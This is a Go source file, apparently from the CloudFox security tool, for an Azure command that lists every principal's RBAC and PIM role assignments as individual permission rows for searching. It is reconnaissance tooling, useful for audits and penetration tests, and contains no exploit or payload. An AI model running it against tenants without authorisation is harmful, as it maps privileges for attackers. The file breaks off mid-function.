package commands

import (
	"bufio"
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/authorization/armauthorization/v2"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/spf13/cobra"
)

// ======================
// Cobra command definition
// ======================
var AzPermissionsCommand = &cobra.Command{
	Use:     "permissions",
	Aliases: []string{"perms", "actions"},
	Short:   "Enumerate Azure permissions line-by-line for granular search",
	Long: `
Enumerate every Azure permission assigned to principals, expanding role definitions into individual actions.
This enables searching for specific permissions like "Microsoft.Compute/virtualMachines/write".

Examples:
  # Enumerate all permissions for a tenant
  ./cloudfox az permissions --tenant TENANT_ID

  # Enumerate permissions for specific subscriptions
  ./cloudfox az permissions --subscription SUB1,SUB2

  # Search for specific permission in output
  grep "virtualMachines/write" cloudfox-output/azure/permissions.csv
`,
	Run: ListPermissions,
}

// ======================
// Output struct
// ======================
type PermissionsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

// PermissionsModule implements granular permission enumeration
type PermissionsModule struct {
	azinternal.BaseAzureModule // Embed common fields (15 fields)

	// Module-specific fields
	Subscriptions    []string
	RoleDefinitions  map[string]*armauthorization.RoleDefinition
	TenantLevel      bool
	SubLevel         bool
	RGLevel          bool
	enrichmentWriter *azinternal.EnrichmentCacheWriter // Per-principal JSONL cache writer

	// Disk-backed row storage (avoids OOM on large tenants)
	permRowFile  *os.File // temp CSV file holding all permission rows
	permRowCount int      // number of rows written to permRowFile
}

var (
	permTenantLevel bool
	permSubLevel    bool
	permRGLevel     bool
)

var PermissionsHeader = []string{
	"Principal GUID",
	"Principal Name",
	"Principal UPN/AppID",
	"Principal Type",
	"Role Name",
	"Permission Type", // Action, NotAction, DataAction, NotDataAction
	"Permission",      // e.g., Microsoft.Compute/virtualMachines/write
	"Tenant Name",     // New: for multi-tenant support
	"Tenant ID",       // New: for multi-tenant support
	"Scope Type",      // Tenant, Subscription, ManagementGroup, ResourceGroup, Resource
	"Scope Name",      // Tenant/Sub/MG/RG name
	"Full Scope Path",
	"Assigned Via", // Direct, Group, Direct (PIM Eligible), Group (PIM Eligible), Direct (PIM Active), Group (PIM Active)
	"Condition",
}

func (o PermissionsOutput) TableFiles() []internal.TableFile { return o.Table }
func (o PermissionsOutput) LootFiles() []internal.LootFile   { return o.Loot }

// openPermRowFile creates a temp CSV file for streaming permission rows to disk.
func (m *PermissionsModule) openPermRowFile() error {
	f, err := os.CreateTemp("", "cloudfox-permissions-*.csv")
	if err != nil {
		return fmt.Errorf("failed to create temp row file: %w", err)
	}
	m.permRowFile = f
	m.permRowCount = 0
	return nil
}

// writePermRows writes a batch of rows to the temp CSV file on disk.
func (m *PermissionsModule) writePermRows(rows [][]string) {
	if m.permRowFile == nil || len(rows) == 0 {
		return
	}
	w := csv.NewWriter(m.permRowFile)
	for _, row := range rows {
		_ = w.Write(row)
	}
	w.Flush()
	m.permRowCount += len(rows)
}

// closePermRowFile closes the temp CSV file (but does not delete it).
func (m *PermissionsModule) closePermRowFile() {
	if m.permRowFile != nil {
		m.permRowFile.Close()
	}
}

// removePermRowFile deletes the temp CSV file.
func (m *PermissionsModule) removePermRowFile() {
	if m.permRowFile != nil {
		os.Remove(m.permRowFile.Name())
	}
}

// iteratePermRows streams through all rows in the temp file, calling fn for each row.
// The file is rewound to the beginning before iteration.
func (m *PermissionsModule) iteratePermRows(fn func(row []string)) error {
	if m.permRowFile == nil {
		return nil
	}
	if _, err := m.permRowFile.Seek(0, 0); err != nil {
		return fmt.Errorf("failed to seek temp row file: %w", err)
	}
	r := csv.NewReader(bufio.NewReaderSize(m.permRowFile, 256*1024))
	for {
		row, err := r.Read()
		if err != nil {
			break
		}
		fn(row)
	}
	return nil
}

// loadEnrichmentCacheToDisk streams the enrichment cache JSONL file directly to the temp
// CSV file on disk, returning only the skip set (principal IDs) in memory.
// This avoids loading 400K+ rows into memory during resume.
func (m *PermissionsModule) loadEnrichmentCacheToDisk(baseDir, tenantID string) (skipSet map[string]bool, count int, rowCount int, err error) {
	cachePath := azinternal.PermEnrichmentCacheFilePath(baseDir, tenantID)
	file, err := os.Open(cachePath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, 0, 0, nil
		}
		return nil, 0, 0, err
	}
	defer file.Close()

	// Dedup map: principalID -> last seen entry rows (streamed to disk, not kept in memory)
	// We do a two-pass approach: first pass deduplicates principal IDs (last-wins),
	// second pass streams rows for the winning entries.
	// But that requires re-reading the file. Instead, for simplicity, stream all rows
	// and accept that duplicate principals will have both old and new rows on disk.
	// The dedup only matters for the skip set (which principals to skip re-enrichment).
	skipSet = make(map[string]bool)
	w := csv.NewWriter(m.permRowFile)

	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)

	for scanner.Scan() {
		line := scanner.Bytes()
		if len(line) == 0 {
			continue
		}
		var entry azinternal.PermEnrichmentCacheEntry
		if err := json.Unmarshal(line, &entry); err != nil {
			continue // skip corrupt lines
		}
		if entry.PrincipalID == "" {
			continue
		}
		skipSet[entry.PrincipalID] = true
		for _, row := range entry.Rows {
			_ = w.Write(row)
			rowCount++
		}
	}
	w.Flush()
	m.permRowCount += rowCount
	count = len(skipSet)

	if count == 0 {
		return nil, 0, 0, nil
	}
	return skipSet, count, rowCount, nil
}

// ======================
// Init flags
// ======================
func init() {
	AzPermissionsCommand.Flags().BoolVar(&permTenantLevel, "tenant-level", false, "Include tenant-level permissions")
	AzPermissionsCommand.Flags().BoolVar(&permSubLevel, "subscription-level", false, "Include subscription-level permissions")
	AzPermissionsCommand.Flags().BoolVar(&permRGLevel, "resource-group-level", false, "Include resource-group-level permissions")
}

// ======================
// Main handler
// ======================
func ListPermissions(cmd *cobra.Command, args []string) {
	// Initialize command context
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_PERMISSIONS_MODULE_NAME)
	if err != nil {
		return
	}

	// Parse permissions-specific flags
	tenantLevel, _ := cmd.Flags().GetBool("tenant-level")
	subLevel, _ := cmd.Flags().GetBool("subscription-level")
	rgLevel, _ := cmd.Flags().GetBool("resource-group-level")

	// Default: if no levels specified, run all levels
	if !tenantLevel && !subLevel && !rgLevel {
		if cmdCtx.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			cmdCtx.Logger.InfoM("No levels specified; defaulting to all levels", globals.AZ_PERMISSIONS_MODULE_NAME)
		}
		tenantLevel = true
		subLevel = true
		rgLevel = true
	}

	// Initialize module
	module := &PermissionsModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 0),
		Subscriptions:   cmdCtx.Subscriptions,
		RoleDefinitions: make(map[string]*armauthorization.RoleDefinition),
		TenantLevel:     tenantLevel,
		SubLevel:        subLevel,
		RGLevel:         rgLevel,
	}

	// Execute module
	module.PrintPermissions(cmdCtx.Ctx, cmdCtx.Logger)
}

// ======================
// PrintPermissions - Main enumeration orchestrator
// ======================
func (m *PermissionsModule) PrintPermissions(ctx context.Context, logger internal.Logger) {
	if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM("Starting comprehensive permissions enumeration", globals.AZ_PERMISSIONS_MODULE_NAME)
		if m.IsMultiTenant {
			logger.InfoM(fmt.Sprintf("Multi-tenant mode: %d tenants", len(m.Tenants)), globals.AZ_PERMISSIONS_MODULE_NAME)
		} else {
			logger.InfoM(fmt.Sprintf("Tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
		logger.InfoM(fmt.Sprintf("Subscriptions: %d", len(m.Subscriptions)), globals.AZ_PERMISSIONS_MODULE_NAME)
		logger.InfoM(fmt.Sprintf("Levels: Tenant=%v, Subscription=%v, ResourceGroup=%v",
			m.TenantLevel, m.SubLevel, m.RGLevel), globals.AZ_PERMISSIONS_MODULE_NAME)
	}

	// Open temp file for streaming rows to disk (avoids OOM on large tenants)
	if err := m.openPermRowFile(); err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to open temp row file: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		return
	}
	defer m.removePermRowFile()
	defer m.closePermRowFile()

	// Multi-tenant processing
	if m.IsMultiTenant {
		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo
			savedSubscriptions := m.Subscriptions

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo
			m.Subscriptions = tenantCtx.Subscriptions

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_PERMISSIONS_MODULE_NAME)
			}

			// Process this tenant
			m.processTenantPermissions(ctx, logger)

			// Restore context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
			m.Subscriptions = savedSubscriptions
		}
	} else {
		// Single tenant processing (existing logic)
		m.processTenantPermissions(ctx, logger)
	}

	// Show completion status
	totalSubs := len(m.Subscriptions)
	errors := m.CommandCounter.Error
	logger.InfoM(fmt.Sprintf("Status: %d/%d subscriptions complete (%d errors)",
		totalSubs-errors, totalSubs, errors), globals.AZ_PERMISSIONS_MODULE_NAME)

	// Write all collected data
	m.writeOutput(ctx, logger)
}

// processTenantPermissions - Process permissions for a single tenant
func (m *PermissionsModule) processTenantPermissions(ctx context.Context, logger internal.Logger) {
	// Step 1: Collect all role definitions (built-in + custom) from first subscription
	if len(m.Subscriptions) > 0 {
		m.collectRoleDefinitions(ctx, m.Subscriptions[0], logger)
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Collected %d role definitions", len(m.RoleDefinitions)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// Step 2: Enumerate ALL principals in the tenant
	logger.InfoM("Enumerating all principals in tenant (users, guests, service principals, groups, managed identities)", globals.AZ_PERMISSIONS_MODULE_NAME)
	allPrincipals := m.enumerateAllPrincipals(ctx, logger)
	if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Found %d total principals to enumerate", len(allPrincipals)), globals.AZ_PERMISSIONS_MODULE_NAME)
	}

	// Step 2.5: Load enrichment cache for resume (stream to disk, not memory)
	// Note: --refresh-cache deletes the enrichment file in PersistentPreRun,
	// so this naturally finds nothing when refreshing.
	var skipSet map[string]bool
	if azinternal.PermEnrichmentCacheExists(m.OutputDirectory, m.TenantID) {
		if azinternal.IsPermEnrichmentCacheStale(m.OutputDirectory, m.TenantID, azinternal.DefaultAzureCacheExpiration) {
			age, _ := azinternal.GetPermEnrichmentCacheAge(m.OutputDirectory, m.TenantID)
			logger.InfoM(fmt.Sprintf("Permissions enrichment cache is stale (age: %s). Use --refresh-cache to force update.", azinternal.FormatCacheAge(age)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
		// Stream cached rows directly to disk temp file (avoids loading into memory)
		ss, count, rowCount, err := m.loadEnrichmentCacheToDisk(m.OutputDirectory, m.TenantID)
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Failed to load permissions enrichment cache, re-enriching all: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		} else if ss != nil {
			skipSet = ss
			logger.InfoM(fmt.Sprintf("Resuming: loaded %d cached principal enrichments (%d permission rows)", count, rowCount), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// Open enrichment cache writer
	writer, err := azinternal.NewJSONLWriter(azinternal.PermEnrichmentCacheFilePath(m.OutputDirectory, m.TenantID))
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to open permissions enrichment cache writer: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
	} else {
		m.enrichmentWriter = writer
		defer func() {
			m.enrichmentWriter.Close()
			m.enrichmentWriter = nil
		}()
	}

	// Filter out already-cached principals
	if skipSet != nil {
		var filtered []azinternal.PrincipalInfo
		for _, p := range allPrincipals {
			if !skipSet[p.ObjectID] {
				filtered = append(filtered, p)
			}
		}
		logger.InfoM(fmt.Sprintf("Enriching %d principals (%d cached, %d total)", len(filtered), len(skipSet), len(allPrincipals)), globals.AZ_PERMISSIONS_MODULE_NAME)
		allPrincipals = filtered
	}

	// Step 3: For each principal, enumerate their permissions at all scopes
	m.enumeratePrincipalPermissions(ctx, allPrincipals, logger)

	// Step 4: Fallback scan for orphaned/unknown principals (100% completeness guarantee)
	logger.InfoM("Performing fallback scan for any orphaned or unknown principals", globals.AZ_PERMISSIONS_MODULE_NAME)
	orphanedPrincipals := m.scanForOrphanedPrincipals(ctx, allPrincipals, logger)
	if len(orphanedPrincipals) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d orphaned/unknown principal(s) with role assignments", len(orphanedPrincipals)), globals.AZ_PERMISSIONS_MODULE_NAME)
		// Enumerate permissions for orphaned principals
		m.enumeratePrincipalPermissions(ctx, orphanedPrincipals, logger)
	} else {
		logger.InfoM("No orphaned principals found - all principals with permissions were enumerated", globals.AZ_PERMISSIONS_MODULE_NAME)
	}
}

// ======================
// collectRoleDefinitions - Get all role definitions (built-in + custom)
// ======================
func (m *PermissionsModule) collectRoleDefinitions(ctx context.Context, subID string, logger internal.Logger) {
	// Get token for ARM scope
	token, err := m.Session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to get token for role definitions: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	cred := &azinternal.StaticTokenCredential{Token: token}

	// Create authorization client factory
	clientFactory, err := armauthorization.NewClientFactory(subID, cred, azinternal.DefaultARMClientOptions())
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to create authorization client factory: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	roleDefClient := clientFactory.NewRoleDefinitionsClient()

	// List all role definitions at subscription scope
	scope := fmt.Sprintf("/subscriptions/%s", subID)
	pager := roleDefClient.NewListPager(scope, nil)

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Failed to list role definitions: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
			m.CommandCounter.Error++
			break
		}

		for _, roleDef := range page.Value {
			if roleDef != nil && roleDef.ID != nil {
				m.RoleDefinitions[*roleDef.ID] = roleDef
				// Also store by name for easier lookup
				if roleDef.Name != nil {
					m.RoleDefinitions[*roleDef.Name] = roleDef
				}
			}
		}
	}
}

// ======================
// scanForOrphanedPrincipals - Fallback scan for any principals with role assignments that weren't discovered
// ======================
func (m *PermissionsModule) scanForOrphanedPrincipals(ctx context.Context, knownPrincipals []azinternal.PrincipalInfo, logger internal.Logger) []azinternal.PrincipalInfo {
	// Build set of known principal IDs
	knownSet := make(map[string]bool, len(knownPrincipals))
	for _, p := range knownPrincipals {
		knownSet[p.ObjectID] = true
	}

	orphanedSet := make(map[string]bool)
	var orphanedPrincipals []azinternal.PrincipalInfo

	addOrphaned := func(principalID string) {
		if knownSet[principalID] || orphanedSet[principalID] {
			return
		}
		orphanedSet[principalID] = true
		displayName := fmt.Sprintf("Orphaned-%s", principalID)
		if len(principalID) >= 8 {
			displayName = fmt.Sprintf("Orphaned-%s", principalID[:8])
		}
		orphanedPrincipals = append(orphanedPrincipals, azinternal.PrincipalInfo{
			ObjectID:          principalID,
			UserPrincipalName: "Unknown",
			DisplayName:       displayName,
			UserType:          "OrphanedUnknown",
		})
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Found orphaned principal: %s", principalID), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// Build permission index and scan all assignees for unknown principal IDs
	permIndex := azinternal.BuildPermissionIndex(ctx, m.Session, m.Subscriptions, m.TenantLevel, m.SubLevel, m.RGLevel)
	for pid := range permIndex {
		addOrphaned(pid)
	}

	return orphanedPrincipals
}

// ======================
// enumerateAllPrincipals - Enumerate ALL principals in the tenant
// Uses in-memory cache from the principals module when available; falls back to API.
// System-assigned MIs are discovered by scanForOrphanedPrincipals (via RBAC cache) instead
// of 11 ARM REST calls per subscription.
// ======================
func (m *PermissionsModule) enumerateAllPrincipals(ctx context.Context, logger internal.Logger) []azinternal.PrincipalInfo {
	var allPrincipals []azinternal.PrincipalInfo

	// 1. Enumerate all Entra users (uses in-memory cache if principals module ran first)
	users, err := azinternal.ListEntraUsers(ctx, m.Session, m.TenantID)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to enumerate Entra users: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
	} else {
		allPrincipals = append(allPrincipals, users...)
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Found %d Entra user(s)", len(users)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// 2. Enumerate all service principals (uses in-memory cache if principals module ran first)
	sps, err := azinternal.ListServicePrincipals(ctx, m.Session, m.TenantID)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to enumerate service principals: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
	} else {
		allPrincipals = append(allPrincipals, sps...)
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Found %d service principal(s)", len(sps)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// 3. Enumerate all user-assigned managed identities
	mis, err := azinternal.ListUserAssignedManagedIdentities(ctx, m.Session, m.Subscriptions)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to enumerate user-assigned managed identities: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
	} else {
		for _, mi := range mis {
			allPrincipals = append(allPrincipals, azinternal.PrincipalInfo{
				ObjectID:          mi.PrincipalID,
				UserPrincipalName: mi.ClientID,
				DisplayName:       mi.Name,
				UserType:          "ManagedIdentity",
			})
		}
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Found %d user-assigned managed identit(ies)", len(mis)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// Note: system-assigned MIs are no longer enumerated via 11 ARM REST calls per subscription.
	// Any system MI with an RBAC assignment will be caught by scanForOrphanedPrincipals,
	// which iterates the RBAC cache for unknown principal IDs.

	return allPrincipals
}

// ======================
// enumeratePrincipalPermissions - Assignment-first bulk architecture
// ======================
func (m *PermissionsModule) enumeratePrincipalPermissions(ctx context.Context, principals []azinternal.PrincipalInfo, logger internal.Logger) {
	logger.InfoM(fmt.Sprintf("Enumerating permissions for %d principals across all scopes", len(principals)), globals.AZ_PERMISSIONS_MODULE_NAME)

	// ── Phase 1: Bulk pre-fetch all tenant data ──
	spinner := internal.NewPhaseSpinner(globals.AZ_PERMISSIONS_MODULE_NAME)

	var wg sync.WaitGroup
	spinner.Add("group memberships")
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer spinner.Done("group memberships")
		azinternal.PreFetchGroupMemberships(ctx, m.Session, m.OutputDirectory, m.TenantID)
	}()

	// Pre-fetch PIM and RBAC data per subscription with concurrency limit
	subSem := make(chan struct{}, 5)
	for _, subID := range m.Subscriptions {
		spinner.Add("PIM roles")
		spinner.Add("RBAC assignments")
		wg.Add(1)
		go func(sid string) {
			defer wg.Done()
			subSem <- struct{}{}
			defer func() { <-subSem }()
			azinternal.PreFetchPIMRolesForSubscription(ctx, m.Session, sid, m.OutputDirectory, m.TenantID)
			spinner.Done("PIM roles")
			azinternal.PreFetchRBACAssignmentsForSubscription(ctx, m.Session, sid, m.OutputDirectory, m.TenantID)
			spinner.Done("RBAC assignments")
		}(subID)
	}
	wg.Wait()

	// Pre-fetch RBAC at resource group scopes (only if RG-level enabled)
	if m.RGLevel {
		for _, subID := range m.Subscriptions {
			spinner.Add("RG RBAC assignments")
			wg.Add(1)
			go func(sid string) {
				defer wg.Done()
				subSem <- struct{}{}
				defer func() { <-subSem }()
				defer spinner.Done("RG RBAC assignments")
				azinternal.PreFetchRBACAssignmentsForResourceGroups(ctx, m.Session, sid)
			}(subID)
		}
		wg.Wait()
	}

	spinner.Stop("Pre-fetching tenant data: done")

	// ── Phase 2: Build permission index from caches (zero API calls) ──
	logger.InfoM("Building permission index from cached assignments", globals.AZ_PERMISSIONS_MODULE_NAME)
	permIndex := azinternal.BuildPermissionIndex(ctx, m.Session, m.Subscriptions, m.TenantLevel, m.SubLevel, m.RGLevel)

	totalAssignments := 0
	for _, assignments := range permIndex {
		totalAssignments += len(assignments)
	}
	logger.InfoM(fmt.Sprintf("Permission index: %d unique assignees, %d total assignments", len(permIndex), totalAssignments), globals.AZ_PERMISSIONS_MODULE_NAME)

	// Load group memberships cache for O(1) lookups
	groupCacheKey := azinternal.AzCacheKey("group-memberships-all", "tenant")
	var groupCache map[string]azinternal.CachedGroupMembership
	if cached, found := azinternal.AzureDataCache.Get(groupCacheKey); found {
		groupCache = cached.(map[string]azinternal.CachedGroupMembership)
	}

	// Copy role definitions to local read-only map (no mutex needed)
	localRoleDefs := make(map[string]*armauthorization.RoleDefinition, len(m.RoleDefinitions))
	for k, v := range m.RoleDefinitions {
		localRoleDefs[k] = v
	}

	// Pre-compute parseScope cache from unique scopes in the index
	scopeCache := make(map[string][2]string) // scope -> [scopeType, scopeName]

	// ── Phase 3: Single pass over principals (zero API calls) ──
	// Pre-sort principals by GUID so rows are written to disk in sorted order
	// (eliminates the need for a post-processing sort of all 400K+ rows)
	sort.Slice(principals, func(i, j int) bool {
		return principals[i].ObjectID < principals[j].ObjectID
	})

	total := len(principals)
	progressInterval := 1000
	if total < 5000 {
		progressInterval = 500
	}

	for i, p := range principals {
		if i > 0 && i%progressInterval == 0 {
			logger.InfoM(fmt.Sprintf("Processing principal %d/%d (%.0f%%)", i, total, float64(i)/float64(total)*100), globals.AZ_PERMISSIONS_MODULE_NAME)
		}

		// Build group memberships from bulk cache
		groupMemberships := make(map[string]string) // groupID -> groupName
		if groupCache != nil {
			if membership, ok := groupCache[p.ObjectID]; ok {
				for idx, gid := range membership.AllGroupIDs {
					name := gid
					if idx < len(membership.AllGroupNames) {
						name = membership.AllGroupNames[idx]
					}
					groupMemberships[gid] = name
				}
			}
		}

		// Collect all assignments for this principal: direct + group-inherited
		var allAssignments []azinternal.PermAssignment
		var allAssignedVia []string

		// Direct assignments
		if direct, ok := permIndex[p.ObjectID]; ok {
			for _, a := range direct {
				allAssignments = append(allAssignments, a)
				allAssignedVia = append(allAssignedVia, m.assignmentAttribution(a, p.ObjectID, ""))
			}
		}

		// Group-inherited assignments
		for gid, gname := range groupMemberships {
			if groupAssignments, ok := permIndex[gid]; ok {
				for _, a := range groupAssignments {
					allAssignments = append(allAssignments, a)
					allAssignedVia = append(allAssignedVia, m.assignmentAttribution(a, "", gname))
				}
			}
		}

		// Expand all assignments into permission rows
		var localRows [][]string
		for idx, a := range allAssignments {
			assignedVia := allAssignedVia[idx]
			m.expandAssignmentRows(p, a, assignedVia, localRoleDefs, scopeCache, &localRows)
		}

		// Stream rows to disk temp file (avoids OOM on large tenants)
		m.writePermRows(localRows)

		// Write to enrichment cache
		if m.enrichmentWriter != nil {
			m.enrichmentWriter.Append(azinternal.PermEnrichmentCacheEntry{
				PrincipalID: p.ObjectID,
				Rows:        localRows,
				Timestamp:   time.Now().Unix(),
			})
		}
	}

	logger.InfoM(fmt.Sprintf("Completed permissions enrichment for %d principals", total), globals.AZ_PERMISSIONS_MODULE_NAME)
}

// assignmentAttribution returns the "Assigned Via" string for an assignment.
func (m *PermissionsModule) assignmentAttribution(a azinternal.PermAssignment, _, groupName string) string {
	switch a.Source {
	case "RBAC":
		if groupName != "" {
			return fmt.Sprintf("Group: %s", groupName)
		}
		return "Direct"
	case "PIM-Eligible":
		if groupName != "" {
			return fmt.Sprintf("Group: %s (PIM Eligible)", groupName)
		}
		return "Direct (PIM Eligible)"
	case "PIM-Active":
		if groupName != "" {
			return fmt.Sprintf("Group: %s (PIM Active)", groupName)
		}
		return "Direct (PIM Active)"
	}
	return "Direct"
}

// expandAssignmentRows expands a single PermAssignment into permission rows using the local
// role definitions map (no mutex) and cached parseScope results.
func (m *PermissionsModule) expandAssignmentRows(
	principal azinternal.PrincipalInfo,
	a azinternal.PermAssignment,
	assignedVia string,
	localRoleDefs map[string]*armauthorization.RoleDefinition,
	scopeCache map[string][2]string,
	localRows *[][]string,
) {
	// Cached scope parsing
	scopeParsed, ok := scopeCache[a.Scope]
	if !ok {
		st, sn := m.parseScope(a.Scope, a.SubName)
		scopeParsed = [2]string{st, sn}
		scopeCache[a.Scope] = scopeParsed
	}
	scopeType := scopeParsed[0]
	scopeName := scopeParsed[1]

	// Look up role definition (read-only, no mutex)
	roleDef, exists := localRoleDefs[a.RoleDefinitionID]
	if !exists {
		parts := strings.Split(a.RoleDefinitionID, "/")
		if len(parts) > 0 {
			roleGUID := parts[len(parts)-1]
			roleDef, exists = localRoleDefs[roleGUID]
		}
	}

	roleName := a.RoleName
	if roleName == "" {
		roleName = "Unknown Role"
	}

	if !exists || roleDef == nil {
		*localRows = append(*localRows, m.buildPermRow(principal, roleName, "Unknown", a.RoleDefinitionID, scopeType, scopeName, a.Scope, assignedVia, a.Condition))
		return
	}

	if roleDef.Properties != nil && roleDef.Properties.RoleName != nil && *roleDef.Properties.RoleName != "" {
		roleName = *roleDef.Properties.RoleName
	}

	if roleDef.Properties == nil || roleDef.Properties.Permissions == nil {
		return
	}

	for _, perm := range roleDef.Properties.Permissions {
		if perm.Actions != nil {
			for _, action := range perm.Actions {
				if action != nil {
					*localRows = append(*localRows, m.buildPermRow(principal, roleName, "Action", *action, scopeType, scopeName, a.Scope, assignedVia, a.Condition))
				}
			}
		}
		if perm.NotActions != nil {
			for _, notAction := range perm.NotActions {
				if notAction != nil {
					*localRows = append(*localRows, m.buildPermRow(principal, roleName, "NotAction", *notAction, scopeType, scopeName, a.Scope, assignedVia, a.Condition))
				}
			}
		}
		if perm.DataActions != nil {
			for _, dataAction := range perm.DataActions {
				if dataAction != nil {
					*localRows = append(*localRows, m.buildPermRow(principal, roleName, "DataAction", *dataAction, scopeType, scopeName, a.Scope, assignedVia, a.Condition))
				}
			}
		}
		if perm.NotDataActions != nil {
			for _, notDataAction := range perm.NotDataActions {
				if notDataAction != nil {
					*localRows = append(*localRows, m.buildPermRow(principal, roleName, "NotDataAction", *notDataAction, scopeType, scopeName, a.Scope, assignedVia, a.Condition))
				}
			}
		}
	}
}

// buildPermRow constructs a single permission row without calling parseScope (pre-parsed).
func (m *PermissionsModule) buildPermRow(
	principal azinternal.PrincipalInfo,
	roleName, permType, permission, scopeType, scopeName, scope, assignedVia, condition string,
) []string {
	return []string{
		principal.ObjectID,          // Principal GUID
		principal.DisplayName,       // Principal Name
		principal.UserPrincipalName, // Principal UPN/AppID
		principal.UserType,          // Principal Type
		roleName,                    // Role Name
		permType,                    // Permission Type
		permission,                  // Permission
		m.TenantName,               // Tenant Name
		m.TenantID,                 // Tenant ID
		scopeType,                  // Scope Type
		scopeName,                  // Scope Name
		scope,                      // Full Scope Path
		assignedVia,                // Assigned Via
		condition,                  // Condition
	}
}

// parseScope parses a scope string into type and name
func (m *PermissionsModule) parseScope(scope, subName string) (scopeType, scopeName string) {
	if scope == "/" {
		return "Tenant", m.TenantName
	}

	if strings.Contains(scope, "/managementGroups/") {
		parts := strings.Split(scope, "/")
		for i, part := range parts {
			if part == "managementGroups" && i+1 < len(parts) {
				return "ManagementGroup", parts[i+1]
			}
		}
		return "ManagementGroup", "Unknown"
	}

	if strings.HasPrefix(scope, "/subscriptions/") {
		parts := strings.Split(scope, "/")

		// Check for resource group
		for i, part := range parts {
			if part == "resourceGroups" && i+1 < len(parts) {
				return "ResourceGroup", parts[i+1]
			}
		}

		// Check for specific resource
		if strings.Contains(scope, "/providers/") {
			return "Resource", permissionsExtractResourceName(scope)
		}

		// Subscription level
		return "Subscription", subName
	}

	return "Unknown", "Unknown"
}

// extractResourceName extracts resource name from resource ID

// ======================
// writeOutput - Stream all collected permissions from disk to final output files
// ======================
func (m *PermissionsModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.permRowCount == 0 {
		logger.InfoM("No permissions found", globals.AZ_PERMISSIONS_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("Dataset size: %d permission rows (disk-backed)", m.permRowCount), globals.AZ_PERMISSIONS_MODULE_NAME)

	// Note: rows are already sorted on disk because principals were pre-sorted by GUID
	// before processing, and each tenant is processed sequentially.

	// Determine output scope
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(
		m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Generate loot files by streaming through the temp file
	lootFiles := m.generatePermissionsLootFiles()

	// Build output directory path
	resultsIdentifier := internal.BuildResultsIdentifier(scopeType, scopeIDs, scopeNames)
	outDirectoryPath := internal.BuildOutputPath(m.OutputDirectory, "Azure", m.UserUPN, resultsIdentifier)

	if err := os.MkdirAll(outDirectoryPath, 0o755); err != nil {
		logger.ErrorM(fmt.Sprintf("Error creating output directory: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	// Stream rows from temp file directly to final output files
